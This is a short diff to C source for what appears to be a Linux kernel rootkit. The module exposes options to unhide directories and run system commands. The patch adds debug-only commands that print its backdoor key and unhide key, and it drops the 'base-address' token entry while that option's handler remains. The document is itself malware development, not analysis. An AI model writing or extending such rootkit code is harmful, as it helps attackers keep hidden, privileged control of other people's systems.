@@ -447,6 +447,12 @@ enum {
 	Opt_journalclt,
 	Opt_fetch_base_address,
 
+#ifdef DEBUG_RING_BUFFER
+	/**debug */
+	Opt_get_bdkey,
+	Opt_get_unhidekey,
+#endif
+
 };
 
 static const match_table_t tokens = {
@@ -466,7 +472,10 @@ static const match_table_t tokens = {
 	{ Opt_unhide_directory, "unhide-directory=%s" },
 
 	{ Opt_journalclt, "journal-flush" },
-	{ Opt_fetch_base_address, "base-address=%d" },
+#ifdef DEBUG_RING_BUFFER
+	{ Opt_get_bdkey, "get-bdkey" },
+	{ Opt_get_unhidekey, "get-unhidekey" },
+#endif
 	{ Opt_unknown, NULL }
 };
 
@@ -564,6 +573,18 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 				kv_run_system_command(cmd);
 			}
 		} break;
+#ifdef DEBUG_RING_BUFFER
+	    case Opt_get_bdkey: {
+			char bits[32 + 1] = { 0 };
+			snprintf(bits, 32, "%lx", auto_bdkey);
+	    	set_elfbits(bits);
+	    } break;
+	case Opt_get_unhidekey: {
+			char bits[32 + 1] = { 0 };
+			snprintf(bits, 32, "%lx", auto_unhidekey);
+	    	set_elfbits(bits);		
+	    } break;
+#endif
 		case Opt_fetch_base_address: {
 			if (sscanf(args[0].from, "%d", &pid) == 1) {
 				unsigned long base;
